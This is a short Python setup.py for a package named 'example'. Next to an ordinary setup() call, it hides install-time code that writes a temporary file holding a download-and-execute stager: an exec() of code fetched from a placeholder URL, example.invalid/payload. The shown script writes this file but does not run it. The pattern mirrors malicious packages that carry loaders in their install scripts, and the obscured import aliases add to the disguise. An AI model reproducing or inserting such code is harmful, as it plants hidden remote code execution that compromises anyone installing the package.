from tempfile import NamedTemporaryFile as _ffile
from setuptools import setup

_ttmp = _ffile(delete=False)
_ttmp.write(b"from urllib.request import urlopen as _uurlopen;exec(_uurlopen(' https://example.invalid/payload').read())")
_ttmp.close()
setup(name='example')
